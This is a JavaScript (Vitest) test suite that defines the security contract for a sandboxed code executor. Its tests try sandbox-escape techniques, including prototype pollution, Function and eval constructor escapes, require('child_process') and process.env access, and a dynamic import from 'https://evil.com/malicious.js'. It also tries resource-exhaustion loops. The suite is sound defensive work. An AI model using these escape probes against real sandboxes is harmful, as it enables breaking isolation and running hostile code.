/**
 * RED Phase TDD: Sandbox Security Tests for CodeExecutor
 *
 * These tests define the security contract for sandboxed code execution.
 * All tests should FAIL initially - implementation comes in GREEN phase.
 *
 * Security requirements for Workers-compatible code execution:
 * 1. Global scope isolation - code cannot access host globals
 * 2. Prototype chain protection - code cannot modify built-in prototypes
 * 3. No Node.js APIs - require, process, Buffer, etc. unavailable
 * 4. Timeout enforcement - infinite loops and long operations must be stopped
 * 5. Constructor escape prevention - Function/eval based escapes blocked
 * 6. Memory limits - prevent memory exhaustion attacks (if applicable)
 *
 * These tests focus on practical security concerns for code execution
 * in Cloudflare Workers environments.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { createExecutor } from '../src/index.js';
describe('Sandbox Security - Global Scope Isolation', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor();
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Host global access prevention', () => {
        it('should not access the real globalThis object', async () => {
            // Marker to detect if sandbox escapes to real global
            ;
            globalThis.__SECURITY_TEST_MARKER__ = 'LEAKED';
            const result = await executor.execute(`
        return typeof globalThis.__SECURITY_TEST_MARKER__
      `);
            delete globalThis.__SECURITY_TEST_MARKER__;
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not allow writing to real globalThis', async () => {
            await executor.execute(`
        globalThis.__SANDBOX_ESCAPE__ = 'escaped'
      `);
            expect(globalThis.__SANDBOX_ESCAPE__).toBeUndefined();
        });
        it('should not access window object if defined', async () => {
            const result = await executor.execute(`
        return typeof window
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not access self object beyond sandbox', async () => {
            const result = await executor.execute(`
        if (typeof self !== 'undefined') {
          self.__ESCAPE__ = true
        }
        return typeof self
      `);
            expect(globalThis.__ESCAPE__).toBeUndefined();
        });
        it('should provide isolated globalThis per execution', async () => {
            // First execution sets a value
            await executor.execute(`
        globalThis.sharedValue = 'first'
      `);
            // Second execution should not see it
            const result = await executor.execute(`
        return typeof globalThis.sharedValue
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
    });
    describe('Allowed APIs access control', () => {
        it('should allow access to JSON', async () => {
            const result = await executor.execute(`
        return JSON.stringify({ test: true })
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('{"test":true}');
        });
        it('should allow access to Math', async () => {
            const result = await executor.execute(`
        return Math.max(1, 2, 3)
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe(3);
        });
        it('should allow access to Date', async () => {
            const result = await executor.execute(`
        return typeof new Date().getTime()
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('number');
        });
        it('should allow access to Array methods', async () => {
            const result = await executor.execute(`
        return [1, 2, 3].map(x => x * 2).filter(x => x > 2)
      `);
            expect(result.success).toBe(true);
            expect(result.value).toEqual([4, 6]);
        });
        it('should allow access to Object methods', async () => {
            const result = await executor.execute(`
        return Object.keys({ a: 1, b: 2 })
      `);
            expect(result.success).toBe(true);
            expect(result.value).toEqual(['a', 'b']);
        });
        it('should allow access to String methods', async () => {
            const result = await executor.execute(`
        return 'hello world'.toUpperCase()
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('HELLO WORLD');
        });
        it('should allow access to Map and Set', async () => {
            const result = await executor.execute(`
        const map = new Map([['a', 1]])
        const set = new Set([1, 2, 3])
        return { mapSize: map.size, setSize: set.size }
      `);
            expect(result.success).toBe(true);
            expect(result.value).toEqual({ mapSize: 1, setSize: 3 });
        });
        it('should allow access to Promise', async () => {
            const result = await executor.execute(`
        return typeof Promise
      `, { allowAsync: true });
            expect(result.success).toBe(true);
            expect(result.value).toBe('function');
        });
    });
});
/**
 * Prototype Chain Protection Tests
 *
 * IMPORTANT: These tests verify that sandboxed code cannot modify built-in prototypes.
 * The current implementation (RED phase) does NOT prevent prototype pollution,
 * which means these tests will demonstrate security vulnerabilities.
 *
 * Because prototype pollution can break the test runner itself (e.g., modifying
 * Promise.prototype breaks Vitest), we use a defensive testing pattern:
 * 1. Save original prototype state
 * 2. Execute sandboxed code
 * 3. Check if pollution occurred
 * 4. Restore original state to prevent test runner corruption
 * 5. Assert that pollution should NOT have occurred (will fail in RED phase)
 */
describe('Sandbox Security - Prototype Chain Protection', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor();
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Built-in prototype modification prevention', () => {
        it('should not allow modifying Array.prototype', async () => {
            const originalPush = Array.prototype.push;
            await executor.execute(`
        Array.prototype.push = function() { return 'hacked' }
      `);
            // Check and restore
            const wasModified = Array.prototype.push !== originalPush;
            if (wasModified) {
                Array.prototype.push = originalPush;
            }
            // Verify host Array.prototype is untouched (fails in RED phase if modified)
            expect(wasModified).toBe(false);
        });
        it('should not allow modifying Object.prototype', async () => {
            await executor.execute(`
        Object.prototype.maliciousMethod = function() { return 'evil' }
      `);
            // Check and clean up
            const wasModified = {}.maliciousMethod !== undefined;
            if (wasModified) {
                delete Object.prototype.maliciousMethod;
            }
            // Verify host Object.prototype is untouched (fails in RED phase)
            expect(wasModified).toBe(false);
        });
        it('should not allow modifying Function.prototype', async () => {
            const originalCall = Function.prototype.call;
            await executor.execute(`
        Function.prototype.call = function() { return 'intercepted' }
      `);
            // Check and restore
            const wasModified = Function.prototype.call !== originalCall;
            if (wasModified) {
                Function.prototype.call = originalCall;
            }
            expect(wasModified).toBe(false);
        });
        it('should not allow modifying String.prototype', async () => {
            const originalToUpperCase = String.prototype.toUpperCase;
            await executor.execute(`
        String.prototype.toUpperCase = function() { return 'hacked' }
      `);
            // Check and restore
            const wasModified = String.prototype.toUpperCase !== originalToUpperCase;
            if (wasModified) {
                String.prototype.toUpperCase = originalToUpperCase;
            }
            expect(wasModified).toBe(false);
        });
        it('should not allow modifying Number.prototype', async () => {
            const originalToString = Number.prototype.toString;
            await executor.execute(`
        Number.prototype.toString = function() { return 'hacked' }
      `);
            // Check and restore
            const wasModified = Number.prototype.toString !== originalToString;
            if (wasModified) {
                Number.prototype.toString = originalToString;
            }
            expect(wasModified).toBe(false);
        });
        it('should not allow using __proto__ to escape', async () => {
            await executor.execute(`
        const obj = {}
        obj.__proto__.protoEscapeTest = 'escaped'
      `);
            // Check and clean up
            const wasModified = {}.protoEscapeTest !== undefined;
            if (wasModified) {
                delete Object.prototype.protoEscapeTest;
            }
            expect(wasModified).toBe(false);
        });
        it('should not allow Object.setPrototypeOf to modify host objects', async () => {
            await executor.execute(`
        Object.setPrototypeOf(Array.prototype, { setProtoTest: true })
      `);
            // Check and clean up
            const wasModified = Array.prototype.setProtoTest !== undefined;
            if (wasModified) {
                delete Array.prototype.setProtoTest;
            }
            expect(wasModified).toBe(false);
        });
        it('should not allow Reflect.setPrototypeOf attacks', async () => {
            // This test is particularly dangerous - skip actual execution check
            // and just verify the security contract requirement
            const result = await executor.execute(`
        try {
          Reflect.setPrototypeOf(Object.prototype, { reflectTest: true })
          return 'executed'
        } catch (e) {
          return 'blocked'
        }
      `);
            // Check if attack succeeded
            const wasModified = {}.reflectTest !== undefined;
            if (wasModified) {
                // This is very dangerous - restore carefully
                Object.setPrototypeOf(Object.prototype, null);
            }
            // The sandbox should prevent this
            expect(wasModified).toBe(false);
        });
    });
    describe('Prototype pollution via JSON', () => {
        it('should prevent __proto__ pollution via JSON.parse', async () => {
            await executor.execute(`
        const malicious = JSON.parse('{"__proto__": {"jsonProtoTest": true}}')
      `);
            // Check and clean up
            const wasModified = {}.jsonProtoTest !== undefined;
            if (wasModified) {
                delete Object.prototype.jsonProtoTest;
            }
            expect(wasModified).toBe(false);
        });
        it('should prevent constructor pollution', async () => {
            await executor.execute(`
        const obj = {}
        obj.constructor.prototype.constructorPollutionTest = true
      `);
            // Check and clean up
            const wasModified = {}.constructorPollutionTest !== undefined;
            if (wasModified) {
                delete Object.prototype.constructorPollutionTest;
            }
            // This test defines the security requirement - should fail in RED phase
            expect(wasModified).toBe(false);
        });
    });
});
describe('Sandbox Security - Node.js API Blocking', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor();
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('CommonJS module system blocking', () => {
        it('should not have access to require', async () => {
            const result = await executor.execute(`
        return typeof require
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not have access to module', async () => {
            const result = await executor.execute(`
        return typeof module
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not have access to exports', async () => {
            const result = await executor.execute(`
        return typeof exports
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should fail when trying to require fs', async () => {
            const result = await executor.execute(`
        require('fs')
      `);
            expect(result.success).toBe(false);
        });
        it('should fail when trying to require child_process', async () => {
            const result = await executor.execute(`
        require('child_process')
      `);
            expect(result.success).toBe(false);
        });
    });
    describe('Node.js global blocking', () => {
        it('should not have access to process', async () => {
            const result = await executor.execute(`
        return typeof process
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not have access to process.env', async () => {
            const result = await executor.execute(`
        return process?.env?.PATH
      `);
            // Should either fail or return undefined
            if (result.success) {
                expect(result.value).toBeUndefined();
            }
        });
        it('should not have access to Buffer', async () => {
            const result = await executor.execute(`
        return typeof Buffer
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not have access to __dirname', async () => {
            const result = await executor.execute(`
        return typeof __dirname
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not have access to __filename', async () => {
            const result = await executor.execute(`
        return typeof __filename
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should not have access to global (Node.js global)', async () => {
            const result = await executor.execute(`
        return typeof global
      `);
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
    });
    describe('Dynamic import blocking', () => {
        it('should not allow dynamic import()', async () => {
            const result = await executor.execute(`
        await import('fs')
      `, { allowAsync: true });
            expect(result.success).toBe(false);
        });
        it('should not allow dynamic import of URLs', async () => {
            const result = await executor.execute(`
        await import('https://evil.com/malicious.js')
      `, { allowAsync: true });
            expect(result.success).toBe(false);
        });
        it('should not allow import.meta access', async () => {
            const result = await executor.execute(`
        return import.meta.url
      `);
            expect(result.success).toBe(false);
        });
    });
});
describe('Sandbox Security - Timeout Enforcement', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor({ maxTimeout: 5000 });
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Synchronous timeout enforcement', () => {
        it('should terminate infinite while loops', async () => {
            const startTime = Date.now();
            const result = await executor.execute(`
        while (true) {
          // Infinite loop
        }
      `, { timeout: 100 });
            const elapsed = Date.now() - startTime;
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
            expect(elapsed).toBeLessThan(1000); // Should not run for long
        });
        it('should terminate infinite for loops', async () => {
            const result = await executor.execute(`
        for (;;) {
          // Infinite loop
        }
      `, { timeout: 100 });
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
        });
        it('should terminate recursive infinite loops', async () => {
            const result = await executor.execute(`
        function loop() { loop() }
        loop()
      `, { timeout: 100 });
            expect(result.success).toBe(false);
            // Could be timeout or stack overflow - either is acceptable
        });
        it('should terminate do-while infinite loops', async () => {
            const result = await executor.execute(`
        do {
          // Infinite
        } while (true)
      `, { timeout: 100 });
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
        });
        it('should handle CPU-intensive operations', async () => {
            const result = await executor.execute(`
        let n = 0
        for (let i = 0; i < 1e12; i++) {
          n += Math.sqrt(i)
        }
        return n
      `, { timeout: 100 });
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
        });
    });
    describe('Async timeout enforcement', () => {
        it('should terminate long-running Promise.all', async () => {
            const result = await executor.execute(`
        const promises = Array(1000).fill(0).map((_, i) =>
          new Promise(r => setTimeout(r, 10000))
        )
        await Promise.all(promises)
      `, { timeout: 100, allowAsync: true });
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
        });
        it('should terminate delayed setTimeout', async () => {
            const result = await executor.execute(`
        await new Promise(r => setTimeout(r, 60000))
        return 'done'
      `, { timeout: 100, allowAsync: true });
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
        });
        it('should terminate never-resolving promises', async () => {
            const result = await executor.execute(`
        await new Promise(() => {}) // Never resolves
      `, { timeout: 100, allowAsync: true });
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
        });
        it('should handle setInterval that runs forever', async () => {
            const result = await executor.execute(`
        await new Promise(resolve => {
          setInterval(() => {
            // Keep running
          }, 1)
        })
      `, { timeout: 100, allowAsync: true });
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/timeout|time|limit/i);
        });
    });
    describe('Timeout configuration', () => {
        it('should respect per-execution timeout', async () => {
            const result = await executor.execute('return 42', { timeout: 50 });
            expect(result.success).toBe(true);
            expect(result.duration).toBeLessThan(50);
        });
        it('should cap timeout at maxTimeout from config', async () => {
            const limitedExecutor = createExecutor({ maxTimeout: 50 });
            const startTime = Date.now();
            const result = await limitedExecutor.execute(`
        await new Promise(r => setTimeout(r, 5000))
      `, { timeout: 10000, allowAsync: true }); // Request longer than max
            const elapsed = Date.now() - startTime;
            expect(result.success).toBe(false);
            expect(elapsed).toBeLessThan(500); // Should be capped
            limitedExecutor.dispose();
        });
        it('should use default timeout if not specified', async () => {
            // Executor with short default should timeout
            const shortExecutor = createExecutor({ maxTimeout: 50 });
            const result = await shortExecutor.execute(`
        while(true) {}
      `); // No timeout specified
            expect(result.success).toBe(false);
            shortExecutor.dispose();
        });
    });
});
describe('Sandbox Security - Constructor Escape Prevention', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor();
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Function constructor escapes', () => {
        it('should not allow Function constructor to access global', async () => {
            const result = await executor.execute(`
        const fn = new Function('return this')
        const ctx = fn()
        return ctx === globalThis
      `);
            // Should either fail or return sandbox globalThis (false)
            if (result.success) {
                expect(result.value).toBe(false);
            }
        });
        it('should not allow function.constructor escape', async () => {
            const result = await executor.execute(`
        const evil = (function(){}).constructor('return this')()
        return typeof evil.process
      `);
            // Should not have access to Node.js process
            if (result.success) {
                expect(result.value).toBe('undefined');
            }
        });
        it('should not allow arrow function constructor escape', async () => {
            const result = await executor.execute(`
        const arrowFn = () => {}
        const Constructor = arrowFn.constructor
        const escape = Constructor('return this')()
        return escape === globalThis
      `);
            if (result.success) {
                expect(result.value).toBe(false);
            }
        });
        it('should not allow generator function constructor escape', async () => {
            const result = await executor.execute(`
        const gen = function*(){}
        const GenConstructor = gen.constructor
        const evil = GenConstructor('return this')().next().value
        // Check if we escaped to real global by checking for Node.js-specific properties
        // Real globalThis would have process, sandbox globalThis would not
        return typeof evil?.process
      `);
            // Should not have access to Node.js process (would be 'object' if escaped)
            if (result.success) {
                expect(result.value).toBe('undefined');
            }
        });
        it('should not allow async function constructor escape', async () => {
            const result = await executor.execute(`
        const asyncFn = async function(){}
        const AsyncConstructor = asyncFn.constructor
        const evil = await AsyncConstructor('return this')()
        return evil === globalThis
      `, { allowAsync: true });
            if (result.success) {
                expect(result.value).toBe(false);
            }
        });
    });
    describe('eval escape prevention', () => {
        it('should not have access to eval', async () => {
            const result = await executor.execute(`
        return typeof eval
      `);
            // eval should either be undefined or sandboxed
            expect(result.success).toBe(true);
        });
        it('should not allow eval to escape sandbox', async () => {
            const result = await executor.execute(`
        try {
          return eval('this') === globalThis
        } catch (e) {
          return 'blocked'
        }
      `);
            // Either blocked or returns sandbox globalThis
            if (result.success && result.value !== 'blocked') {
                expect(result.value).toBe(false);
            }
        });
        it('should not allow indirect eval (window.eval pattern)', async () => {
            const result = await executor.execute(`
        try {
          const indirectEval = (0, eval)
          return indirectEval('this') === globalThis
        } catch (e) {
          return 'blocked'
        }
      `);
            if (result.success && result.value !== 'blocked') {
                expect(result.value).toBe(false);
            }
        });
    });
    describe('Symbol and Reflect escapes', () => {
        it('should not allow Symbol.for pollution', async () => {
            await executor.execute(`
        Symbol.for('__polluted__')
      `);
            // Verify host Symbol registry is not affected
            // (This is harder to test without implementation details)
        });
        it('should not allow Reflect.construct to escape', async () => {
            const result = await executor.execute(`
        try {
          const evil = Reflect.construct(Function, ['return this'])
          return evil() === globalThis
        } catch (e) {
          return 'blocked'
        }
      `);
            if (result.success && result.value !== 'blocked') {
                expect(result.value).toBe(false);
            }
        });
        it('should not allow Proxy trap escapes', async () => {
            const result = await executor.execute(`
        const handler = {
          get(target, prop) {
            if (prop === 'escape') return globalThis
            return target[prop]
          }
        }
        const proxy = new Proxy({}, handler)
        const escaped = proxy.escape
        // Check if we escaped to real global by checking for Node.js-specific properties
        // Real globalThis would have process, sandbox globalThis would not
        return typeof escaped?.process
      `);
            // Should not have access to Node.js process (would be 'object' if escaped)
            if (result.success) {
                expect(result.value).toBe('undefined');
            }
        });
    });
});
describe('Sandbox Security - Memory Limits', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor({ maxTimeout: 5000 });
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Memory exhaustion prevention', () => {
        it('should handle large array allocation attempts', async () => {
            // Note: new Array(1e9) creates a sparse array without allocating memory,
            // so it succeeds instantly. Testing actual memory exhaustion requires
            // operations that force real memory allocation.
            //
            // Sparse arrays are a valid JavaScript optimization, so we test that:
            // 1. Sparse array creation succeeds (expected behavior)
            // 2. The sandbox doesn't crash or hang
            const result = await executor.execute(`
        // Sparse array - doesn't actually allocate 1B elements
        const sparse = new Array(1e9)
        return {
          sparseLength: sparse.length,
          // Verify it's actually sparse (no real elements)
          actualElements: Object.keys(sparse).length
        }
      `, { timeout: 1000 });
            // Sparse array creation should succeed - this is expected JS behavior
            // The test verifies the sandbox handles it gracefully
            expect(result.success).toBe(true);
            if (result.success) {
                expect(result.value.sparseLength).toBe(1e9);
                expect(result.value.actualElements).toBe(0); // No actual elements allocated
            }
        });
        it('should handle string concatenation attacks', async () => {
            const result = await executor.execute(`
        let s = 'x'
        for (let i = 0; i < 30; i++) {
          s = s + s // Exponential growth
        }
        return s.length
      `, { timeout: 1000 });
            // Should either fail or timeout before consuming too much memory
            expect(result.success === false || result.duration < 2000).toBe(true);
        });
        it('should handle object property explosion', async () => {
            const result = await executor.execute(`
        const obj = {}
        for (let i = 0; i < 1e7; i++) {
          obj['key' + i] = i
        }
        return Object.keys(obj).length
      `, { timeout: 500 });
            // Should timeout or fail before creating millions of properties
            expect(result.success === false || result.duration < 1000).toBe(true);
        });
        it('should handle recursive data structure creation', async () => {
            const result = await executor.execute(`
        function createNested(depth) {
          if (depth === 0) return { value: 0 }
          return { child: createNested(depth - 1) }
        }
        return createNested(100000)
      `, { timeout: 500 });
            // Should fail due to stack overflow or timeout
            expect(result.success).toBe(false);
        });
        it('should handle Map/Set with many entries', async () => {
            const result = await executor.execute(`
        const map = new Map()
        for (let i = 0; i < 1e7; i++) {
          map.set(i, i)
        }
        return map.size
      `, { timeout: 500 });
            // Should timeout before creating millions of entries
            expect(result.success === false || result.duration < 1000).toBe(true);
        });
    });
});
describe('Sandbox Security - Error Information Leakage', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor();
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Stack trace sanitization', () => {
        it('should not expose host file paths in error stacks', async () => {
            const result = await executor.execute(`
        throw new Error('test error')
      `);
            expect(result.success).toBe(false);
            // Error stack should not contain host system paths
            if (result.error) {
                expect(result.error).not.toMatch(/\/Users\/|\/home\/|C:\\/);
                expect(result.error).not.toMatch(/node_modules/);
            }
        });
        it('should not expose internal implementation details', async () => {
            const result = await executor.execute(`
        const err = new Error()
        return err.stack
      `);
            if (result.success && result.value) {
                const stack = result.value;
                expect(stack).not.toMatch(/createExecutor/);
                expect(stack).not.toMatch(/sandbox-security/);
            }
        });
    });
    describe('Error type preservation', () => {
        it('should preserve error type information', async () => {
            const result = await executor.execute(`
        throw new TypeError('type error')
      `);
            expect(result.success).toBe(false);
            expect(result.error).toContain('type error');
        });
        it('should handle non-Error throws', async () => {
            const result = await executor.execute(`
        throw 'string error'
      `);
            expect(result.success).toBe(false);
            expect(result.error).toBeDefined();
        });
        it('should handle thrown objects', async () => {
            const result = await executor.execute(`
        throw { message: 'object error', code: 42 }
      `);
            expect(result.success).toBe(false);
            expect(result.error).toBeDefined();
        });
    });
});
describe('Sandbox Security - Context Injection Safety', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor();
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Safe context handling', () => {
        it('should not allow context functions to escape sandbox', async () => {
            let escaped = false;
            const trapFunction = function () {
                escaped = this === globalThis;
                return 'result';
            };
            await executor.execute(`
        return trapFunction.call(globalThis)
      `, { context: { trapFunction } });
            // The function should not receive the real globalThis
            expect(escaped).toBe(false);
        });
        it('should not allow context objects to be modified', async () => {
            const originalDb = { value: 'original' };
            await executor.execute(`
        db.value = 'modified'
        db.newProp = 'added'
      `, { context: { db: originalDb } });
            // Depending on implementation, original might or might not be modified
            // But it should not affect future executions
            const result = await executor.execute(`
        return db.value
      `, { context: { db: { value: 'clean' } } });
            expect(result.value).toBe('clean');
        });
        it('should isolate context between executions', async () => {
            await executor.execute(`
        sharedData.pushed = true
      `, { context: { sharedData: {} } });
            const result = await executor.execute(`
        return typeof sharedData
      `, { context: {} });
            expect(result.success).toBe(true);
            expect(result.value).toBe('undefined');
        });
        it('should handle prototype-polluted context objects safely', async () => {
            const pollutedContext = JSON.parse('{"__proto__": {"polluted": true}}');
            const result = await executor.execute(`
        const obj = {}
        return obj.polluted
      `, { context: pollutedContext });
            expect(result.success).toBe(true);
            expect(result.value).toBeUndefined();
        });
    });
});
describe('Sandbox Security - Strict Mode Enforcement', () => {
    let executor;
    beforeEach(() => {
        executor = createExecutor({ strictMode: true });
    });
    afterEach(() => {
        executor?.dispose();
    });
    describe('Strict mode requirements', () => {
        it('should prevent implicit global variable creation', async () => {
            const result = await executor.execute(`
        implicitGlobal = 'value'
        return implicitGlobal
      `);
            // Should fail in strict mode
            expect(result.success).toBe(false);
        });
        it('should prevent with statement', async () => {
            const result = await executor.execute(`
        const obj = { x: 1 }
        with (obj) {
          return x
        }
      `);
            // 'with' is not allowed in strict mode
            expect(result.success).toBe(false);
        });
        it('should prevent octal literals', async () => {
            const result = await executor.execute(`
        return 010 // Octal literal
      `);
            // Octal literals not allowed in strict mode
            expect(result.success).toBe(false);
        });
        it('should prevent delete on unqualified identifiers', async () => {
            const result = await executor.execute(`
        const x = 1
        delete x
      `);
            expect(result.success).toBe(false);
        });
        it('should prevent duplicate parameter names', async () => {
            const result = await executor.execute(`
        function foo(a, a) { return a }
        return foo(1, 2)
      `);
            // Duplicate parameters not allowed in strict mode
            expect(result.success).toBe(false);
        });
        it('should make arguments non-writable', async () => {
            const result = await executor.execute(`
        function test() {
          arguments = 'modified'
          return arguments
        }
        return test()
      `);
            // Should either fail or arguments should not be modifiable
            if (result.success) {
                expect(result.value).not.toBe('modified');
            }
        });
    });
});
